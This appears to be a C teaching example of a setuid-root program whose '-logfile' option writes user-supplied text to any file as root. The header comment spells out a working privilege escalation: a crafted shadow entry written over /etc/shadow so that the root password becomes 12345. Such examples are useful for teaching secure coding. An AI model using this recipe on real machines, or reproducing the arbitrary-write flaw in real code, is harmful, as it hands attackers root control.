#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h> 
#include <fcntl.h>

//
// chown root:root risky
// chmod 4555 risky
// cp /etc/shadow ~/shadow # backup shadow
// ./risky 'root:$6$X5YSoJ5j$y5Rl0TiyfX9ewWY7WUuhNkRQsJaECCslt3jPxxvAj3uA1nVVLE9R7nf7.4VIbSKwfHpvsLTNv2uEqiRUFA58V/:16431:0:99999:7:::' -logfile /etc/shadow
// root password is now 12345
//

#define LOG_CMD "-logfile"
#define INVALID_CMD 1

int parse_command(char *cmd) {
    /*
        Some code to determine the command the user wants to execute
    */
    return INVALID_CMD;
}

int write_to_log_file(int fd, char *msg) {
    int bytes_to_write = strlen(msg);
    int bytes_written;
    while ((bytes_written = write(fd, msg, bytes_to_write)) > 0) {
        bytes_to_write -= bytes_written;
        msg += bytes_written;
    }
    if (bytes_written == -1) {
        perror("Failed writing to log file");
        exit(EXIT_FAILURE);
    }
}

int main(int argc, char *argv[]) {
    int fd = -1;

    if (argc <= 1) {
        fprintf(stderr, "Invalid number of parameters: %d\n", argc);
        exit(EXIT_FAILURE);
    }

    int cmd = parse_command(argv[1]);

    if (argc >= 4) {
        if (strcmp(argv[2], LOG_CMD) == 0) {
            fd = open(argv[3], O_WRONLY | O_CREAT | O_TRUNC, 0777);
            if (fd == -1) {
                perror("Failed creating log file");
                exit(EXIT_FAILURE);
            }
        }
    }

    if (cmd == INVALID_CMD) {
        if (fd == -1) {
            fprintf(stderr, "Invalid command:\n%s\n", argv[1]);
        } else {
            write_to_log_file(fd, "Invalid command:\n");
            write_to_log_file(fd, argv[1]);
            write_to_log_file(fd, "\n");
            close(fd);
        }

        exit (EXIT_FAILURE);
    }
    
    /*
        Some sensitive code that requires root goes here
    */
    if (fd != -1) {
        close(fd);
    }
    return EXIT_SUCCESS;
}